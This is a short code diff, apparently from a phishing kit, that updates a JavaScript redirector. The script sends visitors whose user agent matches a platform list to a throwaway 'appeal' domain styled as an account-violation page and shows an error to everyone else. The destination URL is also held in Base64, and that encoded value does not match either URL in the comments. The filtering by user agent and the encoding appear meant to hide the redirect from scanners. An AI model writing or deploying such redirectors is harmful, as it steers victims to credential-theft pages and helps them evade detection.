@@ -30,12 +30,12 @@
       const agent = navigator.userAgent || navigator.vendor || window.opera;
       const allowed = supported.some(platform => agent.includes(platform));
 
-      // Base64 for: https://file-an-appeal-508780.netlify.app/
+      // Base64 for: https://appeal-info-violation-xyz-two.vercel.app
       const encoded = "aHR0cHM6Ly9maWxlLWFuLWFwcGVhbDk4MDcubmV0bGlmeS5hcHAv";
 
       if (allowed) {
         
-                window.location.href = "https://file-an-appeal-508780.netlify.app/";
+                window.location.href = "https://appeal-info-violation-xyz-two.vercel.app";
       } else {
         document.getElementById("error").style.display = "block";
       }
